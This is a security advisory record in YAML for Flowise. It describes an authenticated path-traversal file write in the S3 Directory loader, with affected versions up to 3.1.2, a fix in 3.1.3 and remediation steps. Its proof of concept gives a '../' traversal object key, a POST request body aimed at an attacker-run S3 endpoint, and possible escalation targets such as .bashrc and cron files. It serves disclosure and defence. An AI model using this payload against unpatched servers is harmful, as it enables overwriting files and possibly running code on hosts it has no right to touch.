@@ -1,0 +1,491 @@
+advisory_id: GHSA-88pr-878c-24wf
+datasource_id: github_osv/GHSA-88pr-878c-24wf
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-88pr-878c-24wf/GHSA-88pr-878c-24wf.json
+aliases: []
+summary: "Flowise: Authenticated arbitrary file write in the `S3 Directory` document loader\
+  \ via unsanitized S3 object keys\n## Summary                                             \
+  \                                                                                        \
+  \                                                              \n                        \
+  \                  \n  Flowise on current `main` allows an authenticated user with\n  `documentStores:preview-process`\
+  \ permission to trigger the `S3 Directory`                                               \
+  \                                                                                     \n \
+  \ document loader with attacker-controlled S3 object keys. The loader joins\n  each returned\
+  \ S3 key with a temporary directory using `path.join(tempDir, key)`                      \
+  \                                                                                        \
+  \                \n  and writes the object bytes to disk **without validating traversal sequences\n\
+  \  such as `../`**. Cleanup later removes only the original temporary directory,\n  so files\
+  \ written outside that directory persist on the host filesystem.                         \
+  \                                                                                        \
+  \                     \n                                                                 \
+  \                                                                                        \
+  \                                                      \n  This yields **arbitrary file write**\
+  \ with the privileges of the Flowise                                                     \
+  \                                                                                 \n  server\
+  \ process.                                                                               \
+  \                                                                                        \
+  \                       \n                                                               \
+  \                                                                                        \
+  \                                                        \n  A related variant exists in the\
+  \ `S3File` loader when                                                                   \
+  \                                                                                      \n\
+  \  `fileProcessingMethod = unstructured` (same root cause; its cleanup behavior          \
+  \                                                                                        \
+  \                               \n  turns it into a mixed arbitrary write/delete/DoS primitive).\
+  \                                                                                        \
+  \                                             \n                                         \
+  \                                                                                        \
+  \                                                                              \n  ## Affected\
+  \ component                                                                              \
+  \                                                                                        \
+  \                  \n                                                                    \
+  \                                                                                        \
+  \                                                   \n  - `packages/components/nodes/documentloaders/S3Directory/S3Directory.ts`\n\
+  \    - line **191**: `filePath = path.join(tempDir, key)` (unsanitized)                  \
+  \                                                                                        \
+  \                               \n    - line **213**: recursive `mkdirSync` creates parent\
+  \ path                                                                                   \
+  \                                                               \n    - line **216**: `writeFileSync`\
+  \ writes attacker-controlled bytes                                                       \
+  \                                                                                    \n  \
+  \  - line **289**: cleanup only removes the original `tempDir`, so escaped               \
+  \                                                                                        \
+  \                             \n      files remain on disk                               \
+  \                                                                                        \
+  \                                                              \n  - Related (variant):  \
+  \                                                                                        \
+  \                                                                                        \
+  \       \n    `packages/components/nodes/documentloaders/S3File/S3File.ts`               \
+  \                                                                                        \
+  \                                        \n    (lines 756, 780, 782, 817 — arbitrary write\
+  \ + recursive dirname delete)\n                                                          \
+  \                                                                                        \
+  \                                                             \n  ## Reachability        \
+  \                                                                                        \
+  \                                                                                        \
+  \      \n                                                                                \
+  \                                                                                        \
+  \                                       \n  - Routes exposed:                            \
+  \                                                                                        \
+  \                                                                        \n    `packages/server/src/routes/documentstore/index.ts:41,45`\
+  \                                                                                        \
+  \                                                          \n    (`/api/v1/document-store/loader/preview`,\
+  \                                                                                        \
+  \                                                                          \n     `/api/v1/document-store/loader/process/:loaderId`)\
+  \                                                                                        \
+  \                                                                \n  - Both require `documentStores:preview-process`\
+  \                                                                                        \
+  \                                                                      \n  - `packages/server/src/services/documentstore/index.ts:588`\
+  \ passes                                                                                 \
+  \                                                          \n    `data.loaderConfig` straight\
+  \ to the loader node **with no path                                                      \
+  \                                                                                       \n\
+  \    sanitization**                                                                      \
+  \                                                                                        \
+  \                               \n  - `S3Directory` accepts a custom `serverUrl`, so the attacker\
+  \ does **not\n    need access to an existing trusted AWS bucket** — they can point Flowise\
+  \                                                                                        \
+  \                                           \n    at a local MinIO or any S3-compatible endpoint\
+  \ they control                                                                           \
+  \                                                                     \n                 \
+  \                                                                                        \
+  \                                                                                        \
+  \              \n  ## Impact                                                             \
+  \                                                                                        \
+  \                                               \n                                       \
+  \                                                                                        \
+  \                                                                                \n  - Authenticated\
+  \ arbitrary file write to any path writable by the Flowise                               \
+  \                                                                                        \
+  \              \n    process                                                             \
+  \                                                                                        \
+  \                                               \n  - Destructive overwrite of application\
+  \ data, secrets, or configuration                                                        \
+  \                                                                               \n  - Deployment-dependent\
+  \ lift to RCE if the service account can modify                                          \
+  \                                                                                        \
+  \       \n    executable, startup, or interpreter-loaded files                           \
+  \                                                                                        \
+  \                                        \n    (e.g. `.bashrc`, systemd units, cron files,\
+  \ `require.resolve` targets,                                                             \
+  \                                                                        \n    `package.json`\
+  \ postinstall scripts). This is not guaranteed                                           \
+  \                                                                                        \
+  \             \n    product-wide.                         \n                             \
+  \                                                                                        \
+  \                                                                                        \
+  \  \n  ## Preconditions                                                                  \
+  \                                                                                        \
+  \                                   \n                                                   \
+  \                                                                                        \
+  \                                                                    \n  - Flowise instance\
+  \ running (HTTP server mode)                                                             \
+  \                                                                                        \
+  \           \n  - Attacker has a workspace account with the                              \
+  \                                                                                        \
+  \                                            \n    `documentStores:preview-process` role \
+  \                                                                                        \
+  \                                                                             \n  - No additional\
+  \ infrastructure required — `serverUrl` can point to                                     \
+  \                                                                                        \
+  \              \n    attacker-controlled S3-compatible endpoint                          \
+  \                                                                                        \
+  \                                               \n                                       \
+  \                                                                                        \
+  \                                                                                \n  ## Proof\
+  \ of Concept                                                                             \
+  \                                                                                        \
+  \                     \n                                                             \n  1.\
+  \ Authenticate as a user with `documentStores:preview-process`\n  2. Run an S3-compatible\
+  \ server the attacker controls (e.g. MinIO)                                              \
+  \                                                                                        \
+  \      \n  3. Create an object with a traversal key such as:                             \
+  \                                                                                        \
+  \                                       \n     `../../../../tmp/flowise-poc.txt`         \
+  \                                                                                        \
+  \                                                                        \n  4. Trigger: \
+  \                                                                                        \
+  \                                                                                        \
+  \                 \n     POST /api/v1/document-store/loader/preview                      \
+  \                                                                                        \
+  \                                                  \n     (or /api/v1/document-store/loader/process/:loaderId)\
+  \    \n     body: {                                                                      \
+  \                                                                                        \
+  \                                     \n       \"loaderId\": \"s3Directory\",         \n \
+  \      \"loaderConfig\": {                                                               \
+  \                                                                                        \
+  \                                \n         \"serverUrl\": \"http://attacker-minio:9000\"\
+  ,                                                                                        \
+  \                                                                    \n         \"bucketName\"\
+  : \"attacker-bucket\",                                                                   \
+  \                                                                                        \
+  \           \n         \"prefix\": \"\",                                                 \
+  \                                                                                        \
+  \                                                \n         \"credential\": \"\"         \
+  \                           \n       }                                                   \
+  \                                                                                        \
+  \                                                            \n     }                    \
+  \                                   \n  5. Observe that Flowise writes the object bytes to\
+  \ the escaped path                                                                       \
+  \                                                                   \n  6. Observe that cleanup\
+  \ removes only the original temp directory; the\n  escaped file persists                 \
+  \                                                                                        \
+  \                                                                               \n       \
+  \                                                                                        \
+  \                                                                                        \
+  \                        \n  Local reproduction confirmed: writing a key containing     \n\
+  \  `../../escape-target/poc.txt` from a nested temp root created the file                \
+  \                                                                                        \
+  \                               \n  outside the temp directory, and the cleanup removed only\
+  \ `tempDir`.   \n                                                                        \
+  \                                                                                        \
+  \                                               \n  ## Root Cause                        \
+  \                                                                                        \
+  \                                                                                \n      \
+  \                                                       \n  The loader trusts S3 object keys\
+  \ as safe local relative paths. It should                                                \
+  \                                                                                     \n \
+  \ canonicalize the destination with `path.resolve(...)`, verify the resolved             \
+  \                                                                                        \
+  \                              \n  path remains within the intended temp directory, and reject\
+  \ traversal or                                                                           \
+  \                                                          \n  absolute-path patterns before\
+  \ any directory creation or file write.                                                  \
+  \                                                                                        \n\
+  \                                                                                        \
+  \                                                                                        \
+  \                               \n  ## Suggested Remediation                             \
+  \                                                                                        \
+  \                                                                \n                      \
+  \                                                                                        \
+  \                                                                                        \
+  \         \n  The repository already has shared path validators that are not used here:  \
+  \                                                                                        \
+  \                                          \n                                            \
+  \                                                                                        \
+  \                                                                           \n  - `packages/components/src/validator.ts:35`\
+  \ defines traversal checks\n  - `packages/components/src/validator.ts:295` defines `sanitizeFileName`\
+  \                                                                                        \
+  \                                              \n                                        \
+  \                                                                                        \
+  \                                                                               \n  Recommended\
+  \ fix:                                                                                   \
+  \                                                                                        \
+  \                  \n                                                                    \
+  \                                                                                        \
+  \                                                   \n  1. Replace `path.join(tempDir, key)`\
+  \ with a resolve-and-verify flow                                                         \
+  \                                                                                 \n  2. Reject\
+  \ any resolved path outside `tempDir`                                                    \
+  \                                                                                        \
+  \                    \n  3. Prefer a sanitized basename if directory structure is not required\n\
+  \  4. Apply the same fix to the `S3File` loader (`fileProcessingMethod = unstructured` branch)"
+impacted_packages:
+  - purl: pkg:github/flowiseai/flowise
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/flowiseai/flowise
+        commit: 571b5d6218b1c129588ac625c8f20e30905a67cb
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/flowise-components
+    affected_versions: vers:npm/<=3.1.2
+    fixed_versions: vers:npm/3.1.3
+    affected_packages:
+      - pkg:npm/flowise-components@1.0.0
+      - pkg:npm/flowise-components@1.1.0
+      - pkg:npm/flowise-components@1.1.1
+      - pkg:npm/flowise-components@1.2.1
+      - pkg:npm/flowise-components@1.2.2
+      - pkg:npm/flowise-components@1.2.3
+      - pkg:npm/flowise-components@1.2.4
+      - pkg:npm/flowise-components@1.2.5
+      - pkg:npm/flowise-components@1.2.6
+      - pkg:npm/flowise-components@1.2.7
+      - pkg:npm/flowise-components@1.2.8
+      - pkg:npm/flowise-components@1.2.9
+      - pkg:npm/flowise-components@1.2.10
+      - pkg:npm/flowise-components@1.2.11
+      - pkg:npm/flowise-components@1.2.12
+      - pkg:npm/flowise-components@1.2.13
+      - pkg:npm/flowise-components@1.2.14
+      - pkg:npm/flowise-components@1.2.15
+      - pkg:npm/flowise-components@1.2.16
+      - pkg:npm/flowise-components@1.2.17
+      - pkg:npm/flowise-components@1.3.0
+      - pkg:npm/flowise-components@1.3.1
+      - pkg:npm/flowise-components@1.3.2
+      - pkg:npm/flowise-components@1.3.3
+      - pkg:npm/flowise-components@1.3.4
+      - pkg:npm/flowise-components@1.3.5-alpha.0
+      - pkg:npm/flowise-components@1.3.5
+      - pkg:npm/flowise-components@1.3.6
+      - pkg:npm/flowise-components@1.3.7
+      - pkg:npm/flowise-components@1.3.8
+      - pkg:npm/flowise-components@1.3.9
+      - pkg:npm/flowise-components@1.3.10
+      - pkg:npm/flowise-components@1.3.11
+      - pkg:npm/flowise-components@1.4.0-rc.1
+      - pkg:npm/flowise-components@1.4.0
+      - pkg:npm/flowise-components@1.4.1
+      - pkg:npm/flowise-components@1.4.2
+      - pkg:npm/flowise-components@1.4.3
+      - pkg:npm/flowise-components@1.4.4
+      - pkg:npm/flowise-components@1.4.5
+      - pkg:npm/flowise-components@1.4.6
+      - pkg:npm/flowise-components@1.4.7
+      - pkg:npm/flowise-components@1.4.8
+      - pkg:npm/flowise-components@1.4.9
+      - pkg:npm/flowise-components@1.5.0
+      - pkg:npm/flowise-components@1.5.1
+      - pkg:npm/flowise-components@1.5.2
+      - pkg:npm/flowise-components@1.5.3
+      - pkg:npm/flowise-components@1.6.0
+      - pkg:npm/flowise-components@1.6.1
+      - pkg:npm/flowise-components@1.6.2
+      - pkg:npm/flowise-components@1.6.3
+      - pkg:npm/flowise-components@1.6.4
+      - pkg:npm/flowise-components@1.6.5
+      - pkg:npm/flowise-components@1.6.6
+      - pkg:npm/flowise-components@1.6.7
+      - pkg:npm/flowise-components@1.6.8
+      - pkg:npm/flowise-components@1.6.9
+      - pkg:npm/flowise-components@1.6.10
+      - pkg:npm/flowise-components@1.7.0
+      - pkg:npm/flowise-components@1.7.1
+      - pkg:npm/flowise-components@1.7.2
+      - pkg:npm/flowise-components@1.8.0
+      - pkg:npm/flowise-components@1.8.1
+      - pkg:npm/flowise-components@1.8.2
+      - pkg:npm/flowise-components@1.8.3
+      - pkg:npm/flowise-components@1.8.4
+      - pkg:npm/flowise-components@1.8.5
+      - pkg:npm/flowise-components@1.8.6
+      - pkg:npm/flowise-components@2.0.0
+      - pkg:npm/flowise-components@2.0.1
+      - pkg:npm/flowise-components@2.0.2
+      - pkg:npm/flowise-components@2.0.3
+      - pkg:npm/flowise-components@2.0.4
+      - pkg:npm/flowise-components@2.0.5
+      - pkg:npm/flowise-components@2.0.6
+      - pkg:npm/flowise-components@2.0.7
+      - pkg:npm/flowise-components@2.1.0
+      - pkg:npm/flowise-components@2.1.1
+      - pkg:npm/flowise-components@2.1.2
+      - pkg:npm/flowise-components@2.1.3
+      - pkg:npm/flowise-components@2.1.4
+      - pkg:npm/flowise-components@2.1.5
+      - pkg:npm/flowise-components@2.2.0
+      - pkg:npm/flowise-components@2.2.1
+      - pkg:npm/flowise-components@2.2.2
+      - pkg:npm/flowise-components@2.2.3
+      - pkg:npm/flowise-components@2.2.4
+      - pkg:npm/flowise-components@2.2.5
+      - pkg:npm/flowise-components@2.2.6
+      - pkg:npm/flowise-components@2.2.7-patch.1
+      - pkg:npm/flowise-components@2.2.7
+      - pkg:npm/flowise-components@2.2.8
+      - pkg:npm/flowise-components@3.0.0
+      - pkg:npm/flowise-components@3.0.1
+      - pkg:npm/flowise-components@3.0.2
+      - pkg:npm/flowise-components@3.0.3
+      - pkg:npm/flowise-components@3.0.4
+      - pkg:npm/flowise-components@3.0.5
+      - pkg:npm/flowise-components@3.0.6
+      - pkg:npm/flowise-components@3.0.7
+      - pkg:npm/flowise-components@3.0.8
+      - pkg:npm/flowise-components@3.0.9
+      - pkg:npm/flowise-components@3.0.10
+      - pkg:npm/flowise-components@3.0.11
+      - pkg:npm/flowise-components@3.0.12
+      - pkg:npm/flowise-components@3.0.13
+      - pkg:npm/flowise-components@3.1.0
+      - pkg:npm/flowise-components@3.1.1
+      - pkg:npm/flowise-components@3.1.2
+    fixed_packages:
+      - pkg:npm/flowise-components@3.1.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/flowise
+    affected_versions: vers:npm/<=3.1.2
+    fixed_versions: vers:npm/3.1.3
+    affected_packages:
+      - pkg:npm/flowise@1.0.0
+      - pkg:npm/flowise@1.0.1
+      - pkg:npm/flowise@1.1.0
+      - pkg:npm/flowise@1.1.1
+      - pkg:npm/flowise@1.2.1
+      - pkg:npm/flowise@1.2.2
+      - pkg:npm/flowise@1.2.3
+      - pkg:npm/flowise@1.2.4
+      - pkg:npm/flowise@1.2.5
+      - pkg:npm/flowise@1.2.6
+      - pkg:npm/flowise@1.2.7
+      - pkg:npm/flowise@1.2.8
+      - pkg:npm/flowise@1.2.9
+      - pkg:npm/flowise@1.2.10
+      - pkg:npm/flowise@1.2.11
+      - pkg:npm/flowise@1.2.12
+      - pkg:npm/flowise@1.2.13
+      - pkg:npm/flowise@1.2.14
+      - pkg:npm/flowise@1.2.15
+      - pkg:npm/flowise@1.2.16
+      - pkg:npm/flowise@1.3.0
+      - pkg:npm/flowise@1.3.1
+      - pkg:npm/flowise@1.3.2
+      - pkg:npm/flowise@1.3.3
+      - pkg:npm/flowise@1.3.4
+      - pkg:npm/flowise@1.3.5
+      - pkg:npm/flowise@1.3.6
+      - pkg:npm/flowise@1.3.7
+      - pkg:npm/flowise@1.3.8-rc.1
+      - pkg:npm/flowise@1.3.8
+      - pkg:npm/flowise@1.3.9
+      - pkg:npm/flowise@1.4.0-rc.1
+      - pkg:npm/flowise@1.4.0
+      - pkg:npm/flowise@1.4.1
+      - pkg:npm/flowise@1.4.2
+      - pkg:npm/flowise@1.4.3
+      - pkg:npm/flowise@1.4.4
+      - pkg:npm/flowise@1.4.5
+      - pkg:npm/flowise@1.4.6
+      - pkg:npm/flowise@1.4.7
+      - pkg:npm/flowise@1.4.8
+      - pkg:npm/flowise@1.4.9
+      - pkg:npm/flowise@1.4.10
+      - pkg:npm/flowise@1.4.11
+      - pkg:npm/flowise@1.4.12
+      - pkg:npm/flowise@1.5.0
+      - pkg:npm/flowise@1.5.1
+      - pkg:npm/flowise@1.6.0
+      - pkg:npm/flowise@1.6.1
+      - pkg:npm/flowise@1.6.2
+      - pkg:npm/flowise@1.6.3
+      - pkg:npm/flowise@1.6.4
+      - pkg:npm/flowise@1.6.5
+      - pkg:npm/flowise@1.6.6
+      - pkg:npm/flowise@1.7.1
+      - pkg:npm/flowise@1.7.2
+      - pkg:npm/flowise@1.8.0
+      - pkg:npm/flowise@1.8.1
+      - pkg:npm/flowise@1.8.2
+      - pkg:npm/flowise@1.8.3
+      - pkg:npm/flowise@1.8.4
+      - pkg:npm/flowise@2.0.0
+      - pkg:npm/flowise@2.0.1
+      - pkg:npm/flowise@2.0.2
+      - pkg:npm/flowise@2.0.3
+      - pkg:npm/flowise@2.0.4
+      - pkg:npm/flowise@2.0.5
+      - pkg:npm/flowise@2.0.6
+      - pkg:npm/flowise@2.0.7
+      - pkg:npm/flowise@2.1.0
+      - pkg:npm/flowise@2.1.1
+      - pkg:npm/flowise@2.1.2
+      - pkg:npm/flowise@2.1.3
+      - pkg:npm/flowise@2.1.4
+      - pkg:npm/flowise@2.1.5
+      - pkg:npm/flowise@2.2.0
+      - pkg:npm/flowise@2.2.1
+      - pkg:npm/flowise@2.2.2
+      - pkg:npm/flowise@2.2.3
+      - pkg:npm/flowise@2.2.4
+      - pkg:npm/flowise@2.2.5
+      - pkg:npm/flowise@2.2.6-hotfix.1
+      - pkg:npm/flowise@2.2.6
+      - pkg:npm/flowise@2.2.7-patch.1
+      - pkg:npm/flowise@2.2.7
+      - pkg:npm/flowise@2.2.8
+      - pkg:npm/flowise@3.0.0
+      - pkg:npm/flowise@3.0.1
+      - pkg:npm/flowise@3.0.2
+      - pkg:npm/flowise@3.0.3
+      - pkg:npm/flowise@3.0.4
+      - pkg:npm/flowise@3.0.5
+      - pkg:npm/flowise@3.0.6
+      - pkg:npm/flowise@3.0.7
+      - pkg:npm/flowise@3.0.8
+      - pkg:npm/flowise@3.0.10
+      - pkg:npm/flowise@3.0.11
+      - pkg:npm/flowise@3.0.12
+      - pkg:npm/flowise@3.0.13
+      - pkg:npm/flowise@3.1.0
+      - pkg:npm/flowise@3.1.1
+      - pkg:npm/flowise@3.1.2
+    fixed_packages:
+      - pkg:npm/flowise@3.1.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.2'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-88pr-878c-24wf/GHSA-88pr-878c-24wf.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+  - CWE-73
+references:
+  - url: https://github.com/FlowiseAI/Flowise
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/commit/571b5d6218b1c129588ac625c8f20e30905a67cb
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/pull/6549
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-88pr-878c-24wf
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3
+    reference_type: other
+    reference_id: flowise@3.1.3
+exploits: []
